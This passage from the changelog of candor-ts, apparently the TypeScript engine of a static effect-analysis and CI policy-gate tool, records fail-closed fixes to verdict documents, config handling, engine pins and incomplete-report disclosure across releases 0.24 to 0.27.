  declares no inputs anyone can name, so the collision check over them is vacuous — and the real load
  refuses a moment later with the sink armed.
- **A configured dep that cannot be READ now refuses, not just a missing one**, and **the `gate` verb
  arms its `--gate-json -` stream sink.** The first is SPEC §2s MUST, of which only the "does not
  exist" clause was implemented — an unopenable or malformed report was skipped at exit 0, letting its
  caller publish `inferred: []`. The second closed an empty-stream-after-exit-2 channel on the
  supply-chain verb: a consumer reading nothing on stdout after exit 2 cannot tell it from a clean gate.
  Conformance gained PART 35 rows (d)/(e) and PART 36 rows (b4)-(b6).
- **⟨0.27⟩ The three verdict-document cells (SPEC §3.1/§4, conformance PART 36).** (1) The composed
  document's `unevaluated` now lists EVERY rule of a refused policy, not only the offending line — a
  rule absent from the list on an exit-1 document read as evaluated-and-passed (`policyRefusalUnevaluated`,
  shared by both routes; this engine's composed shape was otherwise already the pinned one). (2) The
  stream sink: the early exit-2 causes (unknown flag, valueless gate-adjacent flag, missing target) and
  the baseline-invalid causes now write the fail-closed refusal to `--gate-json -` instead of leaving an
  empty stream; file sinks get the specific reason in place of the armed placeholder. (3) `zeroMatch`:
  the §4 zero-match list now rides the verdict document on BOTH routes, code-point sorted (explicitly —
  JS default sort is UTF-16 order), deduplicated; it was stderr-only.

- **⚠ A configured dep that cannot be read now refuses (exit 2)** — see the spec ruling. This engine
  skipped it with only a "skipped" note, so the omission was not qualified even in the channel a human
  reads, let alone in the report a chained consumer and `gate --report` actually read, where the caller
  published `inferred: []`.


- **⚠ The config channel of the sink guard was silently empty.** `CONFIG_KEYS` and
  `CONFIG_KEYS_IMPLEMENTED` were declared BELOW the guard, so the `loadCandorConfig` call inside it threw
  a temporal-dead-zone error and the `catch` around that call swallowed it — the guard enumerated no
  config-declared inputs at all and a config-declared policy was destroyed at exit 0. A `catch` that
  hides a programming error is a fail-open with a reason attached. The constants are lifted above the
  guard and the discovery is shared with the loader (`discoverConfigFile`).
- **⚠ `deps` paths were split on JS `\\s`, which includes U+00A0**, so a dep path containing a
  non-breaking space became two halves that were both "skipped" — a green run with the dep silently
  unchained, where java and rust loaded it. Paths separate on ASCII whitespace; only key/value is
  Unicode-aware.
- **⚠ `gate --report` did not enumerate the config-declared policy**, so the checked-in form was
  destroyed at exit 0 while the `--policy` form refused.

- **⚠ The collision guard keyed on the FLAG, so a policy from `.candor/config` was invisible to it** —
  the checked-in form, i.e. the one CI actually uses. `--gate-json <that policy>` destroyed it and exited
  0 with `"ok": true`, in all four engines, after the flag-based rows were already green. It now
  enumerates every channel a policy can arrive through, reading the config leniently so it cannot
  pre-empt the real load's refusal.
- **⚠ `gate --report R --gate-json R` destroyed the report it was asked to judge**, then blamed the
  report rather than the collision. §3.3.1 names a report being read as an input. Caught by the new
  conformance rows, not by hand.

- **No collision guard was added here when rust's was.** `--policy P --gate-json P` armed the refusal
  over the policy, every line of it warned as an unknown rule, the gate ran over zero rules, and the run
  exited **0 with `"ok": true`** while the policy was gone. Now refused (exit 2, nothing written), on
  both `scan` and the `gate` verb, with sameness resolved as artifacts and `.candor/config` refused by
  shape.
- **Arming moved ahead of the flag loop.** It ran after, so the loop's own unknown-flag exit left the
  previous run's green in place — the contract depended on argv order.
- **⟨0.27⟩ the `gate` verb's usage boundary is REVERSED, and the test with it.** It held that a usage
  error "was never a gate invocation" and must write nothing. SPEC §3.3 names an unknown flag as a
  broken-gate-config exit-2 cause and §3.1 requires a document on every exit-2 cause, calling a
  carve-out "a fail-open path with a reason attached" — this was that carve-out. `--gate-json <path>`
  WAS requested; a green document from yesterday sitting there is exactly as dangerous however the run
  failed.
- **An unreadable `.candor/config` crashed the `gate` verb.** A bare `readFileSync` let `EACCES` escape:
  node exits **1** — the POLICY VIOLATION code — with a stack trace, and the armed sentinel survived. Two
  sibling readers swallowed the same error to `null`, which silently drops whatever the file configured.
  All three now refuse the same way (exit 2, unevaluable).


- **`gate --report` with a bad locator left the previous verdict on disk.** Fixed — but the arming sits
  *after* usage validation, because ⟨0.24⟩ rules that a usage error was never a gate invocation and must
  write nothing. A test pins that line, and it caught the first attempt.

- **A refusal must never leave the last run's green: `--gate-json` is now armed FAIL-CLOSED at run
  start.** With a mismatched or unreadable `engine` pin this engine exited 2 and left the PREVIOUS run's
  verdict document on disk, so a CI wrapper reading the artifact rather than the exit code reported a
  **pass over a run that refused** — from the release's flagship guard. Arming at the start makes it a
  class fix rather than a branch fix: every exit path leaves a refusal unless the run got far enough to
  replace it. candor-java's `armGateJson` is the model.

- **A bare `engine <impl>` still split the family five ways.** `engine swift` — an operator forgetting
  the version on a qualified line — was skipped by candor-java and treated by the other four as a
  WILDCARD pin whose version is the literal `swift`, so it exited 2 in every engine that is *not* swift:
  one typo, a family-wide outage, on the exact property PART 33 exists to pin. The cause was arm ORDER —
  arity was tested before ownership, so the one-token case was claimed by the wildcard arm before anyone
  asked whose line it was. **A known qualifier now decides ownership first**, per §3.4's "whatever
  follows it" — and nothing following it is a case of that too.
- **The new declared-baseline exit left a STALE `--gate-json` behind.** It printed and exited 2 without
  writing a refusal document, so a CI wrapper reading the artifact rather than the exit code kept seeing
  the PREVIOUS run's `ok: true` — a stale-artifact false green on the machine channel, in a branch java,
  rust and swift all got right.

- **A baseline DECLARED in `.candor/config` but missing is now exit 2, not a green pass.** An adopter
  review measured this as the second-likeliest first-commit mistake (`.candor/` committed, the baseline
  not) and found every engine printing a note and exiting **0** — the gate quietly not gating. The split
  is by SOURCE, because the same absence means two different things: `CANDOR_BASELINE` is set
  unconditionally by the adopt workflow, so a path that is not there means "the ratchet is not adopted
  yet" and stays a note; a checked-in `baseline` line DECLARES that this repo has one, so an absent file
  was deleted or never committed. Verified four-way: config-declared → 2, env-named → 0.


- **Panel review: the pin grammar disagreed across engines on a shared config.** Three confirmed
  divergences, each a case conformance PART 33 had not thought of, all now fixed and pinned there:
  a junked line qualified for ANOTHER implementation (`engine swift 0.99.0 junk`) killed this engine's
  own run — SPEC §3.4 now rules the skip WHOLE-LINE, because a malformed line naming another engine is
  that engine's problem and it refuses on it, while refusing everywhere turns one typo into a
  family-wide outage; `vv0.27.0` was accepted as a version by engines that stripped every leading `v`;
  and a CRLF config broke a MATCHING pin where `\r` was not treated as whitespace.
- **The zero-match disclosure was missing on the `gate --report` route.** java and swift disclosed
  there, this engine did not — so on the supply-chain gate, the surface a consumer points at a report
  someone else produced, a typo'd layer name was still scored as satisfied in silence. SPEC §4's MUST
  carries no route qualifier.


- **⟨0.27⟩ SPEC §3.4 `engine` — the engine↔baseline coupling, enforced here too.** A build that is not
  the pinned one FAILS with exit 2 (UNEVALUABLE, never 1 — a machine consumer must not read "I could not
  trust this result" as "your code broke a rule"). Two of the five verdicts deliberately do NOT change
  the exit code: an absent pin (the key is opt-in by construction) and one this build cannot check,
  which is §3.1's unanswerable-condition rule — disclosed, never scored, *including* as satisfied. An
  unreadable pin (`engine latest`) exits 2 rather than being skipped: this is the one place §6.2's
  warn-and-skip inverts, because skipping a PIN hands the operator a guard they believe is on. A pin
  qualified for another implementation is ignored — one config serves the family, which versions as a
  ladder. Pinned four-way by conformance **PART 33**.


### SPEC §2 `fs` — candor-ts now emits the read/write refinement

`fs` has been in SPEC §2 for a long time and rust and java carry it; candor-ts did not. With candor-swift
gaining it in the same pass, all four engines now answer "does this function read the disk or mutate it"
instead of two answering and two staying silent.

It went unnoticed because the spec's own rule makes partial implementation HONEST — an absent `fs` means
"kind undetermined", never "read-only". The design working is not the same as the gap being closed.

**CORRECTED before release.** The first version was direct-only, from misreading candor-java's `fsDirect`
comment without following it to `fsFixpoint()`. Kinds DO propagate — `fsKinds` now joins the surface loop —
and a `"?"` poison propagates with them: any contributing `Fs` with no determined kind suppresses the whole
field, because `["write"]` there would claim "writes but never reads" about a function that may do both.

Node's sync/promise variants resolve by stripping the `Sync` suffix rather than by listing every pair,
which is what keeps one rule per verb instead of a table that silently misses whichever spelling nobody
listed. `open`/`openSync` take a MODE, so the verb alone does not say and they get NO claim — guessing the
common case would let a function claim a direction on the strength of a verb that revealed none.

Measured: `copyFileSync` → `["read","write"]`, `readFileSync` → `["read"]`, `writeFileSync` → `["write"]`,
a function that merely REACHES a writer → `["write"]` (it PROPAGATES — an earlier draft of this row said
"omitted", describing the direct-only version corrected before release, and contradicting both the
sentence above it and conformance PART 31), `openSync` → omitted. Identical to candor-swift's and
candor-java's answers on the same shapes.

## [0.26.0] — 2026-08-04 ⟨spec 0.26⟩

### ⟨0.26⟩ THE HIERARCHY SIDECAR'S KEY SET IS ITS MANIFEST — both halves

SPEC §2.2 `caeda66`. PRODUCER: `scan.mjs` no longer gates on `if (supers.length)`, so every type the
pass indexed gets a key, `[]` included — 16 keys for a 16-type fixture where three supertypeless ones were
simply missing. CONSUMER: `query-core.mjs`'s `subtypeOf` is three-valued; a walk that runs off the indexed
set is UNANSWERABLE and discloses rather than dropping.

MEASURED on a real scan with only the sidecar doctored: removing the REACHING implementor's entry gave
`[]` where the control gives `[Dispatcher.run]`, while removing the sidecar ENTIRELY left it correct.
Partial information was worse than none — which is why this needed a format change and not a consumer
patch. `loadHierarchy` needed nothing: it already DROPS `@`-prefixed and non-array values rather than
coercing them, so the new `@unanalyzed` diagnostic is ignored and a garbled entry becomes absent →
unanswerable → over-list.

Seven pre-rung fixtures across both suites now carry the root's `[]`. The adoption cost is pinned as its
own test: a pre-rung sidecar WIDENS a disclosure that is explicitly allowed to over-list.

## [0.25.0] — 2026-08-02

⟨spec 0.25⟩ **Floor bump only — no behaviour change in this engine.** SPEC §2 chaining rule 1 now states
that an ambiguous join key is UNIONED rather than dropped; this engine already implemented the union
(conformance PARTs 25/26 pin it four-way), so 0.25 records the contract catching up with the code. See
candor-spec/CHANGELOG.md for the measurement and the reversal note.


**⚠ ⟨0.24⟩ AN ADVISORY VERB MAY BE LESS CERTAIN THAN THE GATE, NEVER MORE — `unverified` AND `fix-gate`
ANSWERED FROM A FALLBACK DERIVATION WHERE `gate --report` REFUSED** (SPEC §3.2 `4fd140c`, pinned by
conformance PART 27 row R11). This is the third instance of one defect and the one that forced the law to
be stated rather than patched a third time. Measured on a report carrying `hosts` but **no `netClass`**,
under `deny Net[unknown-host] app`:

    gate --report        exit 2   §3.1 answerability refusal — it CANNOT judge `app.noClass`
    unverified --strict  exit 0   CLEARS `app.noClass`, and names a DIFFERENT hole instead
    fix-gate  --strict   exit 0   a full hoist plan for `app.noClass`, from the DERIVED class
    fix … Net            exit 0   `crossing:false, reason:"not-forbidden"` — the same guess, asserted

`netClassesOf` floors an absent surface at `unknown-host`, so the class the gate declined to invent was
being invented one call away. The code documented that as intentional — *"no refusal channel, so a hedge
beats a hole"* — and the first half is true. **A hedge does beat a hole. But a derivation is not a hedge;
it is a second opinion, and it is the one opinion an advisory verb is not entitled to.**

So where the gate would refuse for want of evidence: **`unverified` NAMES the function**, because a
function the gate could not judge is an unverified hole in the strongest sense the verb has, and the reason
recorded is **the missing evidence** — never the derived class, which would restate the defect as a
disclosure. It carries no `upgrade`: whether that function passes at all is the open question, so there is
nothing to upgrade yet. **`fix-gate` offers no remedy** premised on evidence the gate refused to read, and
**`fix` refuses with NO `crossing` key at all** (absent, never `false` — "no boundary fix needed" is a
claim). Both list-verbs carry the gate's own `unevaluated: [{rule, why}]` rather than a second spelling of
it, **omit `ok`** for the reason the `unanalyzed` rule above omits it, and **`--strict` exits 2**. The
narrowing context reads `netClass` `authoritative`ly now — off the wire or not at all — which is how
`gate --report`, MCP `candor_gate` and the LSP diagnostics already read it.

**Dropping the plan is not the fix; dropping it silently would trade a fabricated instruction for a false
all-clear** — the standing hazard on every fabrication repair in this project. So the disclosure lands on
**every channel each verb answers on**: CLI JSON, the printed line (candor-rust built a mutant that kept
the whole JSON fix and deleted only that line, and it survived that engine's entire suite), **MCP**
`candor_unverified`/`candor_fix`, and the **LSP** `candor.fix` code action — which read the answer through
`if (!r.crossing)` and so told the user who had explicitly asked for a fix that *"Net isn't forbidden here;
no boundary fix needed"*, the derived all-clear delivered as a clean bill of health.

The containment is computed by the **gate's own** `unanswerableScoped`, not restated beside it, so
`U_clear ⊆ G_clear` holds because one predicate decides both. Ordering matters: the withhold is consulted
only where **no rule certainly denied**, since a rule firing on evidence the report does carry is certain
and dominates (PAPER3 Lemma 2) — a remedy for a certain crossing is still offered. **MIRRORS MEASURED, all
unchanged:** `netClass` on the wire and firing (remedy offered, `--strict` exit 1), `netClass` on the wire
and excluded (silent), the **bare** `deny Net` over the same evidence-less report (narrows on nothing, so
nothing is refused and the remedy stands), and the `Unknown[…]` provable-purity hole with its upgrade.
21 new rows across `test.mjs`/`test-mcp.mjs`/`test-lsp.mjs`; 9-mutant audit.

**⚠ ⟨0.24⟩ `whatif` NOW NAMES THE OPERATOR'S OWN RULE, AND SAYS WHAT A NARROWED VERDICT RESTS ON —
`violations[].conditional`** (SPEC §3.1 `6f30540`, shape corrected by `901f14d`). The field was
**one-engine** (candor-rust) before this, and the ground truth below was read off *that engine's JSON
output* — the spec's own first pin of it was written from a description of rust's behaviour and had to be
corrected, because a pin written without running the thing is a fifth guess, not a constraint.

`whatif` REBUILT the rule it printed, from `effects` + `scope`, normalizing away everything the operator
wrote. MEASURED against candor-rust over byte-identical inputs:

    policy line                                  candor-rust          candor-ts (before)
    `deny Unknown[reflect] app.nat`              verbatim             `deny Unknown app.nat`
    `deny Net[unknown-host,known-partner] app`   verbatim             `deny Net app`
    `deny Net Db  app  # keep app pure`          `deny Net Db  app`   `deny Db Net app`
    `pure app`                                   `pure app`           `deny (pure) app`
    …and `conditional` on the narrowed rows      present              absent everywhere

The narrowed rows are the sharp ones: **the operator's own scoping erased in the verb an agent reads before
editing**, at exactly the moment they are deciding whether that scoping protects them.

**And the two halves only work together, which is why they land in one change.** `whatif` asks about an
effect the code does not have yet, so a narrowing filter quantifies over a CLASS of something that does not
exist and cannot be matched. Charging it stays the right fail-closed default for a pre-edit gate — the edit
could land in any class — but printing the raw line while the verdict stayed filter-blind would be **worse
than the bug it fixes**: the same unconditional *"would violate"*, now attributed to the narrowed line,
reading as a filter candor evaluated and did not. §3.1's rule for exactly this shape settles it — an
unanswerable condition is DISCLOSED, never scored as a failed one — so the verdict and the exit code are
unchanged and the condition rides beside them:

    "violations": [ { "fn": "app.nat", "rule": "deny Net[unknown-host] app",
                      "conditional": "the `Net` you introduce reaches destination class unknown-host" } ]

`conditional` is **omitted** on a rule that does not narrow, so every document from an unfiltered policy —
nearly all of them — stays byte-identical; a `conditional` on every violation would train the reader to
ignore it. It keys on the effect being INTRODUCED, not on the rule merely carrying a bracket, so
`deny Net[unknown-host] Fs app` asked about `Fs` charges `Fs` unconditionally. `dynamic` and config aliases
disclose the classes they RESOLVED TO, since the condition has to name what would have to be *true*.

**It reaches the editor too.** The LSP `candor.whatif` one-liner now reads `✗ deny Net[unknown-host] app
would fire IF …`, and the pinned diagnostic carries the reason there is a condition at all — that surface is
where the operator meets the raw rule mid-edit, so leaving it filter-blind would have moved the defect
rather than fixed it. MCP `candor_whatif` and the CLI share the one query-core evaluation and needed no
change of their own. All 14 differential rows are now byte-equal to candor-rust's `violations` array.

**⚠ ⟨0.24⟩ THE ADVISORY VERBS CERTIFIED A REPORT THEY KNEW THEY COULD NOT SEE ALL OF — `ok` is now OMITTED
over an incomplete report** (SPEC §3.2 `0075987` / `ec1a441`). `gate --report` has refused to read green
over a declared `unanalyzed` manifest since ⟨0.21⟩. `unverified`, `fix-gate` and `whatif` read the same
bytes and answered `ok: true` with an empty array, at exit 0, with no disclosure on any channel — and
`--strict` is how CI consumes the first two:

    over a report declaring `unanalyzed`:
      gate --report        exit 2, incomplete, manifest        <- correct
      unverified --strict  exit 0, ok:true, no disclosure
      fix-gate  --strict   exit 0, ok:true, no disclosure
      whatif               ok present, no disclosure

`unverified` is the sharpest case in the family: it is the verb that exists to say *"your green gate is not
provably green"*. A function in an unparsed file is absent from `functions` altogether, so it cannot be
enumerated as an unverified pass — and that absence is exactly what the verb would have to report.

**Neither boolean is honest, so the field goes.** `ok: true` asserts a claim the input does not license;
`ok: false` would assert *"a hole exists, here it is"* beside an EMPTY array — the fabrication mirror, and
worse than the silence it replaces. An advisory verb over an incomplete report now emits `incomplete: true`
plus the `unanalyzed` manifest, **omits `ok`**, and `--strict` exits **2** (could-not-fully-evaluate, the
gate's code for the same situation). A consumer writing `if (r.ok)` gets a falsy value and fails safe; one
that looks further learns exactly what went unread. Deliberately NOT the refusal document's shape
(`ok:false` + `refused:true`): there `ok:false` is *true* — the gate did not certify — whereas here neither
value is. The gate keeps its `ok:false` and is not changed to match.

**The disclosure reaches every channel each verb answers on**, which is the half a test suite cannot see:
candor-rust built a mutant that kept the whole JSON fix and deleted only the printed human line, and it
survived that engine's entire suite, because absence-asserts on `ok` cannot see stderr. So the CLI prints
the withdrawal too, and **MCP `candor_unverified`** — the surface an agent trusts and no human reads — goes
through the same shared `advisoryAnswer`, with its tool description updated to say that an empty
`unverified` array beside an absent `ok` is not an all-clear. Without `--strict` these verbs stay advisory
at exit 0: the agent fix-loop reads the body, and reddening its exit would be a different change.

The manifest reader for these verbs is deliberately LENIENT where the gate's is loud — the gate is
certifying, so a malformed manifest there is a hard fail that names the key, while refusing to answer at
all here is strictly less than the partial answer §3.2 asks for. Its ELEMENT rule is candor-ts's own gate
normalization rather than candor-swift's: an element that is an object counts, even with no usable `path`,
so the advisory verb can never be LESS sensitive to incompleteness than the gate over the same bytes.

**⚠ ⟨0.24⟩ `fix-gate` AND `unverified` NEVER READ THE RULE'S `Unknown[…]`/`Net[…]` CLASS FILTER — the
over-charge and its silent mirror, closed together** (SPEC §6.2: "THE GATE AND THE DISCLOSURE MUST APPLY
THE SAME RULE, AND SHOULD SHARE THE SAME CODE"). Both verbs computed from the EFFECT SET ALONE, two rungs
after rules acquired a narrowing filter. Measured on a report whose only hole is `native:dlopen`, under
`deny Unknown[reflect,unresolved] app` — a policy that explicitly excludes that class:

    gate --report        exit 0, no violations          <- correct, the class is excluded
    fix-gate --strict    exit 1 + a remedy naming it    <- OVER-CHARGE: a red CI check and a hoist
                                                           instruction for a boundary nothing denies
    unverified --strict  exit 0, ok:true, []            <- UNDER-REPORT, and the worse half

**The under-report is the half that matters.** The layer PASSES the gate *while carrying an `Unknown`*, so
it is by definition a pass-but-Unknown hole — and `unverified`, the verb whose entire job is to say *"your
green gate is not provably green"*, certified it clean. `unverifiedHoleRule` computed `violates = true`
from the effect name and fell through to "a real violation the gate already reports", over a violation the
gate does not report. Same shape on the `Net[…]` sibling (`deny Net[unknown-host]` over a `known-partner`
entry). Closing only the `fix-gate` over-charge would have killed a fabrication and left its silent mirror
standing, which is the standing hazard on fabrication fixes.

The narrowing now lives in **one** predicate (`classFilterExcludes`), factored out of `evaluatePolicy`
where it was inlined — and inlined there is precisely why the two disclosure verbs could not reach it. The
scan-time gate note, a second copy of the `unverified` disclosure, shares it too.

**And the fix created its own mirror, for the fourth time on this rung.** Making the predicate filter-aware
is exactly what first lets a NARROWED rule *be* the rule a hole is disclosed under — and `ruleUpgrade`'s
reconstruction dropped the bracket. It printed the operator's narrowed line back as the WIDE one
(`deny Unknown app`) and advised the nonsense `deny Unknown Unknown app`; on the Net sibling it advised
`deny Net Unknown app`, **silently un-narrowing** a rule the operator scoped to one destination class — an
instruction that reddens a gate on traffic they had accepted. The rendering now moves with the predicate: a
narrowed `Unknown` term is WIDENED rather than duplicated, a `Net[…]` narrowing is preserved, and a rule
carrying no filter renders byte-identically to before (conformance PARTs 12c/12d unmoved).

**⚠ ⟨0.24⟩ A CERTAIN VIOLATION DOMINATES A REFUSAL, AND A REFUSAL STILL WRITES A DOCUMENT** (SPEC §3.1
`7271c69` / `107755b` / `1503368` / `5a8cf48` / `01d5c6b`). Measured on a hand-built report carrying one
unambiguous `Fs` and one `Net` with no `netClass`: a policy holding a firing `deny Fs` **plus** one
unanswerable `deny Net[unknown-host]` exited **2 with no `--gate-json` document at all**, deleting a
*certain* violation from the only channel a CI wrapper reads. `Reject` is upward-closed (PAPER3 Lemma 2),
so a rule that fires on evidence the report carries cannot be un-rejected by however the unanswerable rule
would have resolved. Now **exit 1, with the violation in the document** and the rule that could not be read
disclosed beside it under `unevaluated`; the same holds for the whole-policy `forbid`/`allow` refusals,
which no longer short-circuit. **And every refusal now writes `{spec, ok:false, refused:true, reason,
unevaluated?}` with NO `violations` key** — absent, never `[]`, which is precisely the claim a refusal
cannot make. Six causes measured writing nothing before (unanswerable rule, `forbid`, `allow`, an
unrecognised token, an unreadable policy, a report that did not load), on both routes; a wrapper reading
that path unconditionally was re-reading **the previous run's green verdict as current**. A usage error
still writes nothing — it was never a gate invocation.

Two things fell out of that change and both are recorded because they are the interesting half. Removing
the short-circuit made the evaluator reach code it had never reached, and `reasonClassesMatch` floors an
empty class set at `unresolved` — correct for a MATCHER, wrong as grounds for a FIRING — so
`deny Unknown[unresolved]` over an **inherited, reasonless** `Unknown` began emitting a real violation
record (mutation-verified: with the withholding removed, `app.inherits` appears in `violations`). The
withholding that closes it is per **(rule, function, effect)**, not per (rule, function): measured on
`deny Fs Net[unknown-host]` over one function carrying a certain `Fs` beside a `netClass`-less `Net`, the
pair form gives **exit 2 with the `violations` key absent** — the certain finding deleted, which is the
very harm the precedence ruling exists to fix. And a **corruption** refusal still dominates even a firing
rule: an answerability refusal leaves the premise that the fired rule's evidence was carried intact, while
an unparseable §2 key denies it, so exit 1 there would assert a confidence the input does not support.

**⚠ ⟨0.24⟩ AN UNRECOGNISED POLICY VALUE TOKEN IS A POLICY ERROR — and `parsepolicy` REPORTS it rather than
refusing** (SPEC §6.2 `382a7e0` / `be0b9a9`, §3.1 `6929dce`). A typo **beside valid tokens** was silently
dropped and the rule **NARROWED**: `deny Unknown[dispatch,nativ]` stopped gating native-caused holes while
the operator read a gate that looked armed, and `deny Net[known-partner,unkown-host]` did the same on the
destination class — measured **exit 0** where the correctly-spelled rule exits 1. That is the fail-open and
it is the common case. The sole-unrecognised-token form **WIDENED** to the bare effect while printing
"ignoring policy rule" and then keeping a *different* rule — a false disclosure. Both now **exit 2 on
`gate --report` and `scan --policy`**, naming the token and the accepted set, across all three vocabularies:
the reason-class filter, the `Net` destination-class filter, and the **alias DEFINITION**
(`unknown-alias corp = dispatch,nativ` silently became `{dispatch}` — the typo in the vocabulary the policy
is written against, which fails open identically). `whatif`, `fix`, `fix-gate` and `unverified` never
loaded `unknown-alias` **at all**, so an aliased rule meant one thing in the verb an agent consults before
editing and another in the gate that judges the edit; they now share one policy load with the gate.
**`parsepolicy` is the exception and must not refuse**: it emits its parse plus an `errors` list naming
each token and the accepted set, at exit 0 — putting the refusal in the parser made it exit 2 on the
conformance battery, which carries such tokens deliberately, and **halted the four-way suite at PART 4**.

**⚠ ⟨0.24⟩ POLICY VOCABULARY ANCHORS AT THE POLICY FILE ON BOTH ROUTES, AND IS DISCLOSED** (SPEC §3.1
`99eb4e9` / `b4e9155`). `gate --report` anchored `.candor/config` discovery at the **policy file's**
directory while `scan --policy` anchored at the **target**, so with the policy filed outside the scan tree
the two expanded the same rule differently — §3.1's byte-equality MUST breakable by a file that is neither
the report nor the policy. Measured after: firing alias (exit 1) and tolerating alias (exit 0) both
byte-equal across the routes; reverting the scan anchor alone puts them back at 2 vs 1. Target-scoped keys
(`deps`, `net-partner`, scan settings) are deliberately unmoved — they describe the thing being scanned,
not the language the rules are written in. And because discovery walks parent directories and
`CANDOR_CONFIG` overrides it outright, a verdict moved by an alias now carries
**`policyVocabulary: {config, aliases:{name:[class…]}}`** naming the file *and the definition* — recorded
at the point of USE, so a config defining aliases the policy never mentions discloses nothing and the
verdict stays byte-identical to before.

**⚠ ⟨0.24⟩ …AND THE SAME RULE ON THE CHAINED-DEP ROUTE, where it was broken worse.** A chained dependency
report with a present-but-unparseable §2 key bought the consumer **strictly more confidence than not
chaining the package at all** — the ⟨0.24⟩ `analyzed.count: 0` defect arriving through a different key.
Measured on the standing ratesdep fixture under `deny Fs`: with `functions: "oops"`, `functions: {}` or an
entry's `inferred: null`, the caller `go` came out **ABSENT from `functions`** (a ⟨0.21⟩ positive purity
claim) with no `invisible`, no `coverage.uncovered` and no verdict coverage block, where the *unchained*
arm discloses all four. Its fabrication mirror rode the same line: an entry's `inferred: "Fs"` was
**iterated into characters** and shipped into the consumer's own report as the effect set `['F','s']`, and
`inferred: [7]` arrived as `[7]`. The fix is a **fourth conjunct on the dep-coverage ladder**
(`corruptDepPkgs`, beside stale / incomplete / judged-nothing) plus a corrupt entry registering **no
`crossDeps` cell** — withholding coverage alone was not enough, because a cell short-circuits the ladder
before the coverage check and handed the caller an empty hit. All five corrupt arms now answer *exactly as
the unchained arm does* across entry, coverage, verdict and exit. Strictly additive: only unreadable
values are dropped, every entry that reads cleanly is joined untouched, and a corrupt entry does not
withdraw an intact sibling.

**⚠ ⟨0.24⟩ A PRESENT-BUT-UNPARSEABLE §2 KEY IS CORRUPT INPUT, NOT ITS EMPTY VALUE** (SPEC §2: "a reader
that recovers from a type mismatch by substituting the default … the language's convenience default is the
fail-open direction on every key in this format"). Under ⟨0.21⟩ an entry with no effects is a **positive
purity claim**, so an entry whose `inferred` was coerced from `[1]` to `[]` did not become a gap — it
became a lie, and `gate --report` certified it (measured: exit 0, `{"ok":true,"violations":[]}`). A
21-row matrix over the same policy measured **12 of 14 corrupt-key shapes gating GREEN** before the fix.
`gate --report` (and the MCP `candor_gate` tool) now **exit 2, naming the key**, with no verdict document,
on a §2 key that is *present* and of the wrong shape: entry `fn`/`inferred`/`direct`/`calls`/`unknownWhy`/
`netClass`/`hosts`/`declared`/`undeclared`/`overdeclared`, and envelope `functions`/`analyzed`/`unanalyzed`.
Three shapes worth naming: `unanalyzed: ["src/broken.ts"]` — a bare string list — was dropped and gated
green (the spec records all four engines doing this, and `unanalyzed` non-emptiness *is* the fail-closed
trigger); `analyzed: {count: true}` (swift's NSNumber-bridge case) read as judged-nothing and exited 0; and
`analyzed: {count: 0.5}` / `{count: -1}` rode **verbatim into the verdict document** as a fractional and a
negative analyzed-universe size.

**ABSENT is untouched, and that is half the rule.** An absent key takes its documented default and still
exits 0 — a missing `inferred`, a missing `unanalyzed`, a pre-⟨0.21⟩ report with no `analyzed` at all, an
`analyzed: {}` whose `count` is simply absent, and a present-but-*empty* `unanalyzed`. A wrong-typed key
that **no verdict reads** (`loc`, `hash`, `unresolved`, `unitKind`) is likewise not a refusal: refusing
there would be a spurious-refusal machine rather than a gate. Read-only queries keep the coercion —
`show`/`map`/`tour` over the very bytes the gate refuses still answer, because they return what they found
rather than certifying. Verified on real scan output: hal-explorer (45 entries) and ukri-tfs (4121
entries) gate byte-equal to `scan --policy` across three policies with no spurious refusal.

**⚠ ⟨0.24⟩ A PARTIALLY-CORRUPT MULTI-REPORT PREFIX NO LONGER GATES GREEN** (SPEC §3.1: "a report that
cannot be parsed is corrupt input, not an effect-free package … A located report that yields no
trustworthy functions MUST fail loudly"). `gate --report <prefix>` refused only when EVERY file under the
locator failed to load; with one clean sibling beside one truncated mid-write sibling, the survivor kept
the entry count above zero and the gate exited **0** with `{"ok":true,"violations":[]}` — while the
truncated sibling was the one carrying the `Net` the policy denied. The per-file disclosure was real, but
it went to **stderr**, and a CI wrapper reads the *document*, which was a clean green with no trace that
half the package was missing. Now: any report under the locator that does not load cleanly is **exit 2
with no verdict document at all** — nothing on stdout, nothing written to `--gate-json <file>` — matching
candor-rust and candor-swift on the same fixture. The stderr per-file disclosure is kept. The MCP
`candor_gate` tool had the same hole on the agent channel (a green `{ok: true, violations: []}` result)
and is fixed with it; the read-only tools keep the looser bar deliberately, since a partial answer is a
smaller claim than a green gate. The regression rows assert on the **document**, with controls proving the
same two-sibling prefix still fires a violation and still certifies when both siblings load.

**⚠ ⟨0.24⟩ A CHAINED REPORT WITH `analyzed.count: 0` NO LONGER BUYS COVERAGE — "I judged nothing" must not
read as full coverage** (SPEC §2's three-row table). A report carrying `functions: []` **and**
`analyzed.count: 0` was strictly MORE confident than not chaining the package at all: every call into it
dropped out of `functions`, which under ⟨0.21⟩ is a positive purity claim, with no `invisible`, no
`coverage.uncovered`, no coverage block in `--gate-json` and no line on stderr — while the same scan with
`CANDOR_DEPS` unset disclosed all four. Measured here first, on a two-package fixture (dep `hit()` reads
`/etc/hosts`, app `go()` calls it, `deny Fs`):

    unchained          go -> inferred: [], invisible: ['ratesdep'], coverage.uncovered, κ nudge   exit 0
    trusted            go -> inferred: ['Fs']                                                     exit 1
    count: 0   (pre)   go -> ABSENT FROM `functions`, no coverage, no verdict block, no nudge      exit 0
    count: 0   (post)  go -> identical to the UNCHAINED row, plus a named stderr line              exit 0

**What the fix restores is the DISCLOSURE, not the verdict.** The empty report carries no effects, so this
arm cannot itself trip a gate — it and the unchained arm both exit 0, and the exit-1 flip exists only
against the *trusted* arm. Re-asserting `Fs` here would fabricate an effect the consumer has no evidence
for. The rule lands in `scan.mjs`'s dep loader as a **third conjunct on the covered set**, beside the §2.1
staleness gate and the ⟨0.21⟩ incompleteness one — coverage is the single mechanism that turns a report's
silence into a purity claim, so this is the third answer to "may this silence speak?", and the existing
`invisible` / `coverage.uncovered` / verdict caveat all fall out of it. Not in the gate: a gate reads its
verdict off a coverage decision already made.

**The second row is the control, and it is why this is not a one-liner.** `functions: []` is equally the
shape of an all-pure dependency, whose empty report §2 chaining rule 3 requires a consumer to BELIEVE.
⟨0.21⟩'s `analyzed.count` is the only thing on the wire that separates them, so the predicate is keyed on
that integer and **never** on the emptiness of `functions`: over 1997 JVM dependency jars, 79 emit
`count: 0` (6 granting coverage) against **104 legitimate all-pure reports** — keying on emptiness would
have withdrawn 104 real claims to catch 6. Both directions are mutation-verified. `analyzed` ABSENT is
